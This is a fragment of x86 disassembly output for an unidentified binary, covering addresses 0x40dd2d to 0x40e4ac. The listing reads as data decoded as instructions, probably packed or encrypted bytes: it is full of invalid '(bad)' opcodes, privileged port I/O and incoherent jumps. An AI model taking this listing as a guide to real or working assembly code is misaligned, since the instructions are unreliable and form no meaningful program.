  40dd2d:	or     ecx,DWORD PTR [ecx]
  40dd2f:	(bad)  [eax-0x6339c534]
  40dd35:	sub    bh,BYTE PTR [edx+0x35]
  40dd38:	push   eax
  40dd39:	mov    bh,BYTE PTR [eax-0x1d]
  40dd3c:	adc    al,0x5f
  40dd3e:	das    
  40dd3f:	cwde   
  40dd40:	inc    ebx
  40dd41:	cld    
  40dd42:	je     0x40dd62
  40dd44:	mov    ecx,0x7684c5a0
  40dd49:	sub    al,0x6
  40dd4b:	(bad)  
  40dd4d:	cdq    
  40dd4e:	cmp    DWORD PTR [esp+ebp*4-0x63],ebp
  40dd52:	scas   al,BYTE PTR es:[edi]
  40dd53:	mov    dl,0xe3
  40dd55:	xor    ecx,DWORD PTR [edi+0x2c36a8a]
  40dd5b:	sbb    BYTE PTR [esi+0x72c5304b],dh
  40dd61:	loop   0x40dda6
  40dd63:	adc    bh,al
  40dd65:	adc    DWORD PTR [eax+eiz*8-0x33],0x100725a8
  40dd6d:	cmp    eax,0x27624f37
  40dd72:	push   ebx
  40dd73:	mov    WORD PTR [ebp+eiz*2-0x6104dfbe],es
  40dd7a:	add    edi,DWORD PTR [edx]
  40dd7c:	test   BYTE PTR [edi],0x82
  40dd7f:	and    al,0xa2
  40dd81:	lds    edi,FWORD PTR [ebx-0x80]
  40dd84:	jne    0x40dd0d
  40dd86:	cs jns 0x40dd27
  40dd89:	lock fcomp QWORD PTR [eax-0x67]
  40dd8d:	pushf  
  40dd8e:	iret   
  40dd8f:	or     edx,edx
  40dd91:	mov    ebp,0x6d58d6c4
  40dd96:	stc    
  40dd97:	push   cs
  40dd98:	sub    DWORD PTR [ebp-0x69],ecx
  40dd9b:	int3   
  40dd9c:	add    ebp,DWORD PTR [esi+0x17b66c18]
  40dda2:	and    dl,BYTE PTR [ebx-0x13]
  40dda5:	jne    0x40dddc
  40dda7:	inc    ecx
  40dda8:	mov    ds:0xf4de21b3,eax
  40ddad:	xchg   ecx,eax
  40ddae:	dec    ebx
  40ddaf:	stc    
  40ddb0:	gs popa 
  40ddb2:	and    DWORD PTR [ecx-0x2e],edi
  40ddb5:	aad    0xf8
  40ddb7:	daa    
  40ddb8:	into   
  40ddb9:	mov    eax,DWORD PTR [edx+0x41]
  40ddbc:	mov    esi,0x7c768111
  40ddc1:	retf   
  40ddc2:	loope  0x40dd4f
  40ddc4:	mov    ah,0xac
  40ddc6:	push   0xa4575793
  40ddcb:	push   esp
  40ddcc:	dec    ecx
  40ddcd:	adc    DWORD PTR [ecx+esi*1+0x53],0xffffffb2
  40ddd2:	rcr    BYTE PTR [eax+eax*8],0x0
  40ddd6:	popa   
  40ddd7:	fistp  QWORD PTR [edx]
  40ddd9:	sub    ch,BYTE PTR [edx-0x30383bca]
  40dddf:	jmp    0x40ddba
  40dde1:	shr    cl,1
  40dde3:	inc    esp
  40dde4:	xchg   ecx,eax
  40dde5:	jmp    0x40de0c
  40dde7:	cmp    DWORD PTR [ebx-0x66921f23],esp
  40dded:	jp     0x40de67
  40ddef:	adc    al,BYTE PTR [edx+0x76]
  40ddf2:	jnp    0x40de3b
  40ddf4:	fld    DWORD PTR [edx-0x6fc6e17e]
  40ddfa:	loope  0x40de72
  40ddfc:	push   0x389b0d06
  40de01:	in     al,0x7c
  40de03:	xchg   edi,eax
  40de04:	push   esi
  40de05:	sub    BYTE PTR [eax+0x6d],bl
  40de08:	mov    BYTE PTR ds:0x9d3d4c4e,ch
  40de0e:	mov    ch,0x8c
  40de10:	push   es
  40de11:	and    BYTE PTR [esi],dl
  40de13:	jns    0x40dda9
  40de15:	push   ecx
  40de16:	outs   dx,BYTE PTR ds:[esi]
  40de17:	popf   
  40de18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de19:	mov    al,ds:0xc4865554
  40de1e:	aam    0x6d
  40de20:	sbb    al,0x95
  40de22:	fadd   DWORD PTR [ebp+0x66]
  40de25:	push   esi
  40de26:	jae    0x40de27
  40de28:	sbb    DWORD PTR ds:0xa77b6d56,0x32ffc76
  40de32:	mov    ecx,ds
  40de34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de35:	mov    edi,0xd61fec54
  40de3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de3b:	ret    0x4bf5
  40de3e:	inc    ecx
  40de3f:	dec    ebx
  40de40:	idiv   DWORD PTR [eax-0x12]
  40de43:	mov    dl,0x4f
  40de45:	imul   esp,edi,0x62
  40de48:	or     DWORD PTR [ebp-0x32c33aa2],esi
  40de4e:	xor    BYTE PTR [esi-0x15],bh
  40de51:	loopne 0x40dde2
  40de53:	clc    
  40de54:	mov    BYTE PTR [bp+di-0x6a],bl
  40de58:	xchg   esi,eax
  40de59:	xor    al,0x55
  40de5b:	adc    DWORD PTR [esi-0x6b],0xffffff88
  40de5f:	and    DWORD PTR [esi-0x7eeb2abc],ebp
  40de65:	loop   0x40de19
  40de67:	out    0xf4,eax
  40de69:	loopne 0x40deaf
  40de6b:	jmp    FWORD PTR [esi]
  40de6d:	ss push edi
  40de6f:	push   edx
  40de70:	and    BYTE PTR [edi-0x3533680d],bh
  40de76:	mov    edx,0x929090d8
  40de7b:	aad    0x63
  40de7d:	push   cs
  40de7e:	and    eax,0xeddfc9c9
  40de83:	jmp    FWORD PTR [ecx]
  40de85:	sbb    DWORD PTR [ecx+ebp*1+0x7b],0xf9da0e86
  40de8d:	imul   edi,eax,0xfffffff7
  40de90:	add    dh,BYTE PTR [eax]
  40de92:	js     0x40de74
  40de94:	mov    al,ds:0x8b9e5f21
  40de99:	ins    BYTE PTR es:[edi],dx
  40de9a:	or     ecx,DWORD PTR [ebx-0x5a85982a]
  40dea0:	xchg   edi,eax
  40dea1:	test   al,0x43
  40dea3:	loopne 0x40decb
  40dea5:	mov    ebx,0xf9016367
  40deaa:	xor    al,0x8b
  40deac:	loopne 0x40dec5
  40deae:	sub    DWORD PTR [edx-0x1331f5b1],0x30
  40deb5:	fldcw  WORD PTR [ebx]
  40deb7:	or     BYTE PTR [edx-0x74],bh
  40deba:	retf   
  40debb:	add    eax,0xb374dcce
  40dec0:	and    DWORD PTR [ecx+0x4c],0x6f
  40dec4:	scas   al,BYTE PTR es:[edi]
  40dec5:	jb     0x40df27
  40dec7:	popa   
  40dec8:	std    
  40dec9:	pop    edx
  40deca:	adc    eax,DWORD PTR [edx]
  40decc:	sbb    al,al
  40dece:	retf   0xa956
  40ded1:	jmp    0x40de5e
  40ded3:	int    0x82
  40ded5:	and    bh,BYTE PTR [edi]
  40ded7:	adc    dh,BYTE PTR ds:0xa6b43edb
  40dedd:	call   0x462b7f81
  40dee2:	push   ecx
  40dee3:	add    BYTE PTR [ebx-0x56],bl
  40dee6:	pop    ebx
  40dee7:	sti    
  40dee8:	cmp    BYTE PTR [ebp-0x13668060],bh
  40deee:	test   cl,dl
  40def0:	test   DWORD PTR [ecx],edx
  40def2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40def3:	adc    BYTE PTR [edx],ah
  40def5:	push   esp
  40def6:	bound  ebx,QWORD PTR [ebx-0x3d372252]
  40defc:	cmp    al,0xa1
  40defe:	fstp   TBYTE PTR [eax+0x72ea13c]
  40df04:	mov    eax,0xf1e5e0d2
  40df09:	sahf   
  40df0a:	mov    ecx,0x91b2be11
  40df0f:	or     al,0x2
  40df11:	sbb    DWORD PTR [esi+0x0],edi
  40df14:	call   0xd94e89c2
  40df19:	sbb    DWORD PTR [edx-0x4d77703c],eax
  40df1f:	sbb    al,0xff
  40df21:	mov    cs,WORD PTR [edi]
  40df23:	(bad)  
  40df24:	loopne 0x40df3e
  40df26:	or     al,0x6f
  40df28:	repnz fsubrp st(2),st
  40df2b:	xchg   DWORD PTR [ebp-0x1b972273],esp
  40df31:	mov    eax,0xa5ae96be
  40df36:	in     eax,0x86
  40df38:	loop   0x40df94
  40df3a:	jl     0x40df79
  40df3c:	inc    ecx
  40df3d:	mov    dl,0x6f
  40df3f:	loop   0x40df3f
  40df41:	outs   dx,DWORD PTR ds:[esi]
  40df42:	add    edx,DWORD PTR ds:0x2c52d5eb
  40df48:	test   eax,0xb1db743b
  40df4d:	cmp    eax,0xd58eeec7
  40df52:	push   ebx
  40df53:	pop    es
  40df54:	and    eax,0xa3dcf47
  40df59:	sbb    eax,0x49c2adf2
  40df5e:	and    ch,dh
  40df60:	ret    0x6820
  40df63:	and    esi,DWORD PTR [edx+0x2176901c]
  40df69:	cmp    DWORD PTR [eax],0xdd45e2c1
  40df6f:	add    edi,0xffffffd4
  40df72:	pop    esi
  40df73:	or     al,0x2a
  40df75:	ins    DWORD PTR es:[edi],dx
  40df76:	(bad)  
  40df77:	(bad)  
  40df78:	xchg   ebp,eax
  40df79:	ja     0x40dff4
  40df7b:	push   cs
  40df7c:	push   ds
  40df7d:	mov    ah,0xae
  40df7f:	or     DWORD PTR [edx],0xffffffea
  40df82:	ss xor eax,0x966185b6
  40df88:	mov    esi,0xf12f5e9
  40df8d:	ins    DWORD PTR es:[edi],dx
  40df8e:	lock sub cl,BYTE PTR [ecx-0x45]
  40df92:	adc    bl,ch
  40df94:	inc    edx
  40df95:	sub    al,0xe4
  40df97:	loopne 0x40dfb9
  40df99:	and    esp,DWORD PTR [eax-0xb718f3f]
  40df9f:	xor    DWORD PTR [edi+0x5d23c785],esp
  40dfa5:	call   0x1658e865
  40dfaa:	js     0x40df2d
  40dfac:	fmul   QWORD PTR ds:0xed32b4a7
  40dfb2:	or     BYTE PTR [ecx+eiz*1+0xf],dh
  40dfb6:	push   ebx
  40dfb7:	je     0x40df9e
  40dfb9:	test   eax,0xecf40da4
  40dfbe:	push   edi
  40dfbf:	mov    ebp,0x14bf74d3
  40dfc4:	jp     0x40e026
  40dfc6:	ror    DWORD PTR [esi],0xd0
  40dfc9:	cs cwde 
  40dfcb:	pop    eax
  40dfcc:	nop
  40dfcd:	cwde   
  40dfce:	dec    esp
  40dfcf:	jne    0x40dfff
  40dfd1:	push   es
  40dfd2:	test   eax,0x91a5eb44
  40dfd7:	popf   
  40dfd8:	imul   BYTE PTR [ecx+0x1e]
  40dfdb:	sub    al,0xb8
  40dfdd:	rol    DWORD PTR [esi],cl
  40dfdf:	pop    esi
  40dfe0:	adc    al,0x75
  40dfe2:	neg    BYTE PTR [edx-0x1e]
  40dfe5:	neg    DWORD PTR [ebp+0x251c467c]
  40dfeb:	int3   
  40dfec:	pop    eax
  40dfed:	sbb    eax,0x16
  40dff0:	pop    esp
  40dff1:	pop    esp
  40dff2:	pop    ecx
  40dff3:	cmp    edx,ebx
  40dff5:	sub    esi,edx
  40dff7:	fcom   DWORD PTR [ecx-0x22]
  40dffa:	mov    ebx,esp
  40dffc:	xor    DWORD PTR [eax+0x67],eax
  40dfff:	iret   
  40e000:	ins    BYTE PTR es:[edi],dx
  40e001:	jb     0x40dff1
  40e003:	jge    0x40e003
  40e005:	jmp    0x93bad9e0
  40e00a:	push   cs
  40e00b:	and    al,0x4e
  40e00d:	pop    esp
  40e00e:	mov    DWORD PTR [esi],esp
  40e010:	dec    edx
  40e011:	data16 xor al,0xe2
  40e014:	pop    edx
  40e015:	xchg   BYTE PTR [ecx],cl
  40e017:	aaa    
  40e018:	add    al,0x83
  40e01a:	fidivr DWORD PTR [ebx+ebx*1+0x54]
  40e01e:	and    dh,BYTE PTR [ecx+0x71d2d2e6]
  40e024:	repz (bad) 
  40e026:	into   
  40e027:	inc    ebx
  40e028:	mov    dl,ch
  40e02a:	push   esp
  40e02b:	mov    ah,0x67
  40e02d:	scas   al,BYTE PTR es:[edi]
  40e02e:	push   es
  40e02f:	fs test eax,0x2d2928ec
  40e035:	push   cs
  40e036:	mov    eax,ds:0xed944b02
  40e03b:	pushf  
  40e03c:	cdq    
  40e03d:	loope  0x40e0aa
  40e03f:	pusha  
  40e040:	push   eax
  40e041:	jl     0x40e0c2
  40e043:	pop    edx
  40e044:	loop   0x40dffe
  40e046:	mov    ebp,0xbb4f1e9d
  40e04b:	and    al,0x20
  40e04d:	outs   dx,BYTE PTR ds:[esi]
  40e04e:	adc    eax,DWORD PTR [eax+0x3a2c35fc]
  40e054:	repnz shr BYTE PTR [esi],1
  40e057:	pop    DWORD PTR [edi+eax*2-0x279e40b1]
  40e05e:	jno    0x40dff2
  40e060:	ret    0xe19a
  40e063:	pushf  
  40e064:	vxorps ymm6,ymm3,YMMWORD PTR [ecx]
  40e068:	xchg   ecx,eax
  40e069:	jns    0x40e08f
  40e06b:	sbb    al,0x49
  40e06d:	inc    esp
  40e06f:	inc    eax
  40e070:	(bad)  
  40e071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e072:	inc    ebx
  40e073:	dec    edi
  40e074:	cmp    al,0xfb
  40e076:	jmp    0x7461:0x3f940aff
  40e07d:	imul   ebp,DWORD PTR [ecx-0x51],0xfae5eef1
  40e084:	mov    edx,0x5b927c4d
  40e089:	xchg   edi,eax
  40e08a:	(bad)  
  40e08b:	mov    ds,WORD PTR [esi+0x30]
  40e08e:	ret    0x5ffe
  40e091:	add    BYTE PTR [edi+eiz*4+0x5],bl
  40e095:	test   al,0xc2
  40e097:	and    bh,dl
  40e099:	rcl    DWORD PTR [edx-0x68c2a959],0xf7
  40e0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0a1:	and    DWORD PTR [ecx+edx*8],0xffffff91
  40e0a5:	pop    ecx
  40e0a6:	shl    ebx,cl
  40e0a8:	jo     0x40e06a
  40e0aa:	test   BYTE PTR [eax],bl
  40e0ac:	out    0xb1,al
  40e0ae:	mov    eax,ds:0x14a341ee
  40e0b3:	inc    ecx
  40e0b5:	fmul   DWORD PTR [ebp+ebx*4-0x26]
  40e0b9:	sub    DWORD PTR [eax+eax*4],ecx
  40e0bc:	loop   0x40e117
  40e0be:	inc    esp
  40e0bf:	push   es
  40e0c0:	sbb    BYTE PTR [ecx+0x24],dh
  40e0c3:	adc    BYTE PTR ds:0x15969d7a,dh
  40e0c9:	fadd   st(2),st
  40e0cb:	xchg   DWORD PTR cs:[ecx],esi
  40e0ce:	ret    0xb4e7
  40e0d1:	mov    cl,0x1f
  40e0d3:	mov    cl,0x65
  40e0d5:	mov    edx,0x14370ad0
  40e0da:	cmp    BYTE PTR [edi],cl
  40e0dc:	xchg   DWORD PTR [edx-0x5e6abc95],edi
  40e0e2:	add    ebp,DWORD PTR [edx+edi*4-0x13]
  40e0e6:	cli    
  40e0e7:	ss mov bl,0xb8
  40e0ea:	sub    eax,0x76c8e563
  40e0ef:	xchg   DWORD PTR [edx+0x44d48ae3],esp
  40e0f5:	mov    esi,0xe7987415
  40e0fa:	mov    esi,0x5793aeef
  40e0ff:	das    
  40e100:	push   eax
  40e101:	dec    esp
  40e102:	push   0xffffffe4
  40e104:	cmp    al,0x46
  40e106:	sub    eax,0x560c041d
  40e10b:	push   cs
  40e10c:	sbb    al,0xd
  40e10e:	cmp    esp,DWORD PTR es:[eax+0x58719563]
  40e115:	xor    al,0x21
  40e117:	push   cs
  40e118:	or     BYTE PTR [eax-0x1c],bl
  40e11b:	lock fsubr DWORD PTR [edx]
  40e11e:	retf   
  40e11f:	fisttp DWORD PTR [ecx+0x2dd2c8ba]
  40e125:	xchg   dl,dl
  40e127:	lock ret 
  40e129:	ds cli 
  40e12b:	lock mov dl,0x2a
  40e12e:	pop    es
  40e12f:	mov    dl,0x8d
  40e131:	cli    
  40e132:	icebp  
  40e133:	cmp    BYTE PTR [eax+0x45d2213c],bh
  40e139:	xor    cl,BYTE PTR [ebp+ebp*2+0x53ac8315]
  40e140:	mov    DWORD PTR [eax],esp
  40e142:	inc    edi
  40e143:	cmp    dh,bl
  40e145:	daa    
  40e146:	inc    esp
  40e147:	mov    dh,0xb
  40e149:	aaa    
  40e14a:	mov    eax,0x2ba2a37a
  40e14f:	sbb    DWORD PTR [ebx+0x195e6cfa],esi
  40e155:	rol    DWORD PTR [ebx+0x67],1
  40e158:	jo     0x40e115
  40e15a:	in     eax,0xb8
  40e15c:	push   edx
  40e15d:	fnstcw WORD PTR [ebp-0x1363ba24]
  40e163:	xor    DWORD PTR [ecx-0x50],esi
  40e166:	dec    esi
  40e167:	dec    edi
  40e168:	int    0xca
  40e16a:	jne    0x40e0f1
  40e16c:	sbb    eax,0xcad5ac7b
  40e171:	and    eax,0x921fe0ef
  40e176:	das    
  40e177:	sar    BYTE PTR [ebp+eiz*8-0x2bf332ad],1
  40e17e:	(bad)
  40e181:	jno    0x40e135
  40e183:	dec    edx
  40e184:	mov    ecx,ss
  40e186:	repz push ds
  40e188:	xor    al,0xa1
  40e18a:	out    dx,eax
  40e18b:	sub    eax,0xa7910b61
  40e190:	jle    0x40e209
  40e192:	in     al,dx
  40e193:	ss jge 0x40e15b
  40e196:	repz fstp DWORD PTR [esi+0x7c]
  40e19a:	fcom   st(0)
  40e19c:	dec    ebp
  40e19d:	cld    
  40e19e:	out    dx,al
  40e19f:	and    dl,dl
  40e1a1:	push   es
  40e1a2:	lea    ecx,[edi+0x8381dff]
  40e1a8:	imul   edi,DWORD PTR ds:[ebx-0x3780e133],0x23
  40e1b0:	aam    0x18
  40e1b2:	cmc    
  40e1b3:	outs   dx,BYTE PTR ds:[esi]
  40e1b4:	mov    edi,eax
  40e1b6:	xchg   esi,eax
  40e1b7:	retf   0x979
  40e1ba:	inc    esp
  40e1bb:	fmul   QWORD PTR [ecx+0x5a]
  40e1be:	mov    dh,0xfb
  40e1c0:	jmp    0xc03f803e
  40e1c5:	in     al,dx
  40e1c6:	dec    bl
  40e1c8:	sar    BYTE PTR ds:0x9eac84be,cl
  40e1ce:	push   edi
  40e1cf:	fwait
  40e1d0:	test   al,0x66
  40e1d2:	mov    eax,0x804af551
  40e1d7:	aaa    
  40e1d8:	xor    bh,BYTE PTR [ecx-0x6f5e5050]
  40e1de:	push   esp
  40e1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e0:	out    dx,eax
  40e1e1:	dec    eax
  40e1e2:	and    eax,0x6dd3c9df
  40e1e7:	jnp    0x40e178
  40e1e9:	xor    esp,DWORD PTR [edx-0x40a7cee7]
  40e1ef:	nop
  40e1f0:	dec    ecx
  40e1f1:	sbb    BYTE PTR [ebp+0x29],cl
  40e1f4:	test   eax,0x39b63b5e
  40e1f9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e1fb:	adc    al,0xe
  40e1fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1fe:	(bad)
  40e201:	push   ebx
  40e202:	retf   
  40e203:	xchg   DWORD PTR [ecx+esi*8],eax
  40e206:	jne    0x40e21d
  40e208:	jbe    0x40e1a9
  40e20a:	or     eax,0x8ce5e718
  40e20f:	lock xchg ch,dl
  40e212:	mov    eax,ds:0x7db9bbdd
  40e217:	inc    ecx
  40e218:	pop    es
  40e219:	inc    esp
  40e21a:	xor    DWORD PTR [ebx+0x18931a9f],0x4a
  40e221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e222:	in     al,0x99
  40e224:	sub    BYTE PTR [ebx],0x3
  40e227:	ja     0x40e203
  40e229:	inc    edx
  40e22a:	jns    0x40e20c
  40e22c:	arpl   WORD PTR [ebx+edi*8],sp
  40e22f:	aaa    
  40e230:	or     BYTE PTR [ebx+0x4d],al
  40e233:	in     eax,dx
  40e234:	adc    DWORD PTR ds:0x9b1ccb49,esp
  40e23a:	push   0x27
  40e23c:	and    DWORD PTR fs:[ebx+esi*4],edx
  40e240:	rcr    BYTE PTR [ebx+0x533488f8],cl
  40e246:	sbb    al,ah
  40e248:	jecxz  0x40e2a6
  40e24a:	out    0x4e,al
  40e24c:	push   ss
  40e24d:	cli    
  40e24e:	inc    ebx
  40e24f:	in     al,dx
  40e250:	fmul   DWORD PTR [ebx-0x1307f4b1]
  40e256:	(bad)  
  40e257:	cmp    DWORD PTR [ecx],ebp
  40e259:	cli    
  40e25a:	and    DWORD PTR [eax],esp
  40e25c:	das    
  40e25d:	adc    eax,0x44b16da2
  40e262:	dec    eax
  40e263:	xlat   BYTE PTR ds:[ebx]
  40e264:	cmp    eax,0x4e4bcf90
  40e269:	push   edx
  40e26a:	and    eax,0xbeecf3fe
  40e26f:	or     DWORD PTR [eax],0xffffffad
  40e272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e273:	fimul  WORD PTR [ecx+ebx*1-0x33]
  40e277:	and    eax,0xf47e228a
  40e27c:	cmp    BYTE PTR [edx+0x43],ah
  40e27f:	add    eax,ebx
  40e281:	out    0x20,al
  40e283:	iret   
  40e284:	mov    ah,BYTE PTR [ecx-0x38]
  40e287:	outs   dx,BYTE PTR ds:[esi]
  40e288:	inc    edx
  40e289:	jmp    0x1087:0x54525f3c
  40e290:	mov    eax,ds:0xd04f64fa
  40e295:	push   esp
  40e296:	jmp    0x40e26b
  40e298:	andps  xmm2,XMMWORD PTR [edx-0x1b]
  40e29c:	stos   BYTE PTR es:[edi],al
  40e29d:	pop    ebp
  40e29e:	xor    bl,BYTE PTR [edi-0x75]
  40e2a1:	push   0xd396d56
  40e2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a7:	adc    cl,BYTE PTR ds:0x19613b20
  40e2ad:	mov    bh,0x3c
  40e2af:	lods   al,BYTE PTR ds:[esi]
  40e2b0:	cmp    DWORD PTR [eax-0x2],0x6f
  40e2b4:	lea    esp,[edi]
  40e2b6:	shl    ah,cl
  40e2b8:	stos   BYTE PTR es:[edi],al
  40e2b9:	fcomp  st(0)
  40e2bb:	lahf   
  40e2bc:	pop    ebx
  40e2bd:	xor    DWORD PTR [eax],edx
  40e2bf:	imul   esi,esi,0xffffffc3
  40e2c2:	sbb    eax,0x20a3f2b7
  40e2c7:	retf   
  40e2c8:	pop    edi
  40e2c9:	ret    
  40e2ca:	push   ss
  40e2cb:	add    bl,BYTE PTR [edi+0x79]
  40e2ce:	arpl   WORD PTR [esi+0x1266fba0],bx
  40e2d4:	call   DWORD PTR [edi+eax*2+0x1527c73d]
  40e2db:	xor    DWORD PTR [esi],esi
  40e2dd:	xor    eax,edi
  40e2df:	or     edi,DWORD PTR [ecx+0x4c]
  40e2e2:	arpl   bp,di
  40e2e4:	(bad)  
  40e2e5:	fsubr  QWORD PTR [esi]
  40e2e7:	or     al,0xe
  40e2e9:	jmp    0x8d97bf81
  40e2ee:	scas   eax,DWORD PTR es:[edi]
  40e2ef:	(bad)  
  40e2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f1:	xor    al,0x46
  40e2f3:	cmp    ebp,DWORD PTR [ebx]
  40e2f5:	ret    
  40e2f6:	sbb    ch,BYTE PTR [edi-0x37585c]
  40e2fc:	add    eax,ebx
  40e2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ff:	aas    
  40e300:	inc    ebp
  40e301:	lea    esi,[ebx+0x83b6eab]
  40e307:	pop    ds
  40e308:	sti    
  40e309:	test   eax,0x925c5be4
  40e30e:	in     al,0xff
  40e310:	test   BYTE PTR ds:0x4369e362,dh
  40e316:	mov    ch,0x5e
  40e318:	xchg   BYTE PTR [edi+0x2a8a82c2],cl
  40e31e:	call   0xa50b:0xf6aaf1ad
  40e325:	test   al,0xa8
  40e327:	push   ss
  40e328:	push   edi
  40e329:	int    0x1b
  40e32b:	jg     0x40e397
  40e32d:	in     eax,dx
  40e32e:	inc    ebp
  40e32f:	lds    esi,FWORD PTR [ebx-0x3353da0c]
  40e335:	jp     0x40e3a7
  40e337:	pushw  ss
  40e339:	pop    ss
  40e33a:	test   eax,0x561b5aea
  40e33f:	sti    
  40e340:	fiadd  DWORD PTR [esi]
  40e342:	daa    
  40e343:	xchg   ebp,eax
  40e344:	sub    al,BYTE PTR [ebp-0x689f9a5c]
  40e34a:	std    
  40e34b:	mov    esp,0xf6a0e2
  40e350:	mov    BYTE PTR [ebx-0x46],0x18
  40e354:	mov    bh,0x5f
  40e356:	rcl    DWORD PTR [ebx-0x4d23092],1
  40e35c:	mov    al,ds:0x9d98d0ca
  40e361:	inc    esp
  40e362:	add    DWORD PTR ds:0x51985a52,esp
  40e368:	ds jg  0x40e354
  40e36b:	adc    cl,0xca
  40e36e:	sbb    esi,DWORD PTR [ebx-0x3c]
  40e371:	outs   dx,DWORD PTR ds:[esi]
  40e372:	pop    ebp
  40e373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e374:	in     eax,dx
  40e375:	pushf  
  40e376:	inc    ecx
  40e377:	dec    esp
  40e378:	pop    ss
  40e379:	push   ecx
  40e37a:	jp     0x40e327
  40e37c:	mov    eax,ds:0xb603a77b
  40e381:	pop    edx
  40e382:	sub    al,0x25
  40e384:	sar    BYTE PTR [edx+0x5a5bfbc8],1
  40e38a:	mov    eax,0x7fc6d841
  40e38f:	pop    ss
  40e390:	jle    0x40e3ad
  40e392:	cli    
  40e393:	sbb    bh,BYTE PTR [ebp+0x1cf50d8c]
  40e399:	retf   
  40e39a:	cs shl cl,1
  40e39d:	mov    ebx,0xc042bcf7
  40e3a2:	lods   eax,DWORD PTR ds:[esi]
  40e3a3:	push   ds
  40e3a4:	xchg   ecx,eax
  40e3a5:	adc    al,0x22
  40e3a7:	daa    
  40e3a8:	push   0xffffffef
  40e3aa:	(bad)  
  40e3ab:	fbstp  TBYTE PTR [edi-0x54714b5f]
  40e3b1:	popf   
  40e3b2:	lods   al,BYTE PTR ds:[esi]
  40e3b3:	sbb    BYTE PTR fs:[ecx+0x5f],ch
  40e3b7:	and    ecx,DWORD PTR [esi]
  40e3b9:	cmc    
  40e3ba:	paddb  mm1,QWORD PTR [esi-0x3fabd86e]
  40e3c1:	adc    DWORD PTR gs:[ebx+0x4fe3e29c],0xf76848d5
  40e3cc:	imul   dh
  40e3ce:	loope  0x40e352
  40e3d0:	xchg   DWORD PTR [ebx],esi
  40e3d2:	cmp    al,0x3d
  40e3d4:	pop    ds
  40e3d5:	(bad)  
  40e3d6:	outs   dx,DWORD PTR ds:[esi]
  40e3d7:	cs xor al,0xf1
  40e3da:	outs   dx,DWORD PTR ds:[esi]
  40e3db:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40e3dd:	cmc    
  40e3de:	test   al,0xfa
  40e3e0:	ins    BYTE PTR es:[edi],dx
  40e3e1:	inc    ecx
  40e3e2:	ss pop ebx
  40e3e4:	ret    0x63c9
  40e3e7:	inc    esi
  40e3e8:	cld    
  40e3e9:	or     BYTE PTR [edx-0x1b3f9f77],bh
  40e3ef:	mov    dh,0xbf
  40e3f1:	ins    DWORD PTR es:[edi],dx
  40e3f2:	pop    ebx
  40e3f3:	adc    dl,BYTE PTR [ecx-0x283db7aa]
  40e3f9:	rol    BYTE PTR [edi],0x26
  40e3fc:	and    al,0x96
  40e3fe:	scas   al,BYTE PTR es:[edi]
  40e3ff:	inc    ebx
  40e400:	ins    BYTE PTR es:[edi],dx
  40e401:	adc    dl,0xb8
  40e404:	out    0xc6,eax
  40e406:	lahf   
  40e407:	(bad)  
  40e408:	adc    al,cl
  40e40a:	pop    eax
  40e40b:	adc    BYTE PTR [ebx-0x43],ch
  40e40e:	repnz and al,0xe1
  40e411:	xchg   BYTE PTR [ecx],ah
  40e413:	rol    BYTE PTR [edi],1
  40e415:	mov    edx,0x2a7488fd
  40e41a:	nop
  40e41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e41c:	fnstcw WORD PTR [esi-0x5c]
  40e41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e420:	in     al,0xa3
  40e422:	or     al,0x13
  40e424:	lods   al,BYTE PTR ds:[esi]
  40e425:	clc    
  40e426:	xchg   esi,esi
  40e428:	mov    ds:0x3856273,al
  40e42d:	int3   
  40e42e:	test   DWORD PTR [ebx],ebp
  40e430:	jae    0x40e4af
  40e432:	or     DWORD PTR [ecx],eax
  40e434:	push   ss
  40e435:	xchg   ecx,eax
  40e436:	add    bl,BYTE PTR [esi+edi*1]
  40e439:	fisub  WORD PTR [ebx]
  40e43b:	test   eax,0xc631abc9
  40e440:	jge    0x40e44f
  40e442:	push   0x8c23bd1a
  40e447:	mov    edi,0x1835b5ec
  40e44c:	cwde   
  40e44d:	xchg   esi,eax
  40e44e:	inc    esi
  40e44f:	inc    esp
  40e450:	xchg   ebp,eax
  40e451:	(bad)  
  40e452:	sub    eax,0x85d6592b
  40e457:	out    0x4d,al
  40e459:	f2xm1  
  40e45b:	sbb    DWORD PTR [ebp+ebx*1-0x5df167ea],esi
  40e462:	ret    
  40e463:	adc    DWORD PTR [ebx+edi*4+0x7f585f72],0xe
  40e46b:	mov    ebx,DWORD PTR [edi+0x5cfa6ede]
  40e471:	out    dx,eax
  40e472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e473:	add    al,BYTE PTR [ebx-0x5fba19c9]
  40e479:	cdq    
  40e47a:	cli    
  40e47b:	jno    0x40e4ad
  40e47d:	mov    BYTE PTR [ebx-0x18],dh
  40e480:	xor    DWORD PTR [edi],0xd44e0bd8
  40e486:	inc    esi
  40e487:	fdivr  QWORD PTR [eax+0x3b373634]
  40e48d:	push   ebx
  40e48e:	ror    esp,cl
  40e490:	jecxz  0x40e47f
  40e492:	xor    DWORD PTR [ecx+0x39c8561e],0x58
  40e499:	or     al,0xd7
  40e49b:	jge    0x40e41e
  40e49d:	inc    ecx
  40e49e:	fsubp  st(6),st
  40e4a0:	es scas al,BYTE PTR es:[edi]
  40e4a2:	mov    al,al
  40e4a4:	test   al,0x3f
  40e4a6:	mov    bh,0x84
  40e4a8:	jno    0x40e483
  40e4aa:	jae    0x40e482
  40e4ac:	mov    eax,ds:0x46eee8ac
